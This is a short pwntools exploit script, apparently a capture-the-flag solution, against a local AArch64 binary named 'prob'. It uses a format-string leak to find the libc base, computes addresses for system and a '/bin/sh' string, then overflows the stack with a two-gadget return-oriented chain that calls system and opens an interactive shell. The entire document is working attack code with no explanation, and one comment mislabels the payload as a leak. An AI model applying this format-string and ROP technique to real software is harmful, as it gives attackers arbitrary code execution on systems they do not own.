from pwn import *

p=process("./prob")

p.sendline(b"%3$lx")

libc_addr=int(p.recv(10),16)
libc_base=libc_addr-0x1b4c40
libc_system=libc_base+0x40890
libc_sh=libc_base+0x11979 

gadget1=libc_base+0xd0860 # mov x0, x20 ; blr x21
gadget2=libc_base+0xbf384 # ldp x21, x30, [sp, #0x10] ; ldp x19,x20, [sp], #0x20 ; ret
log.info("libc_base:"+hex(libc_base))
log.info("libc_system:"+hex(libc_system))
log.info("libc_sh:"+hex(libc_sh))

pay=b"A"*0x18

#leak libc address
pay+=p64(gadget2)
pay+=p64(libc_sh)*2 # x19, x20
pay+=p64(libc_system) # x21
pay+=p64(gadget1)     # x30

p.sendline(pay)

p.interactive()

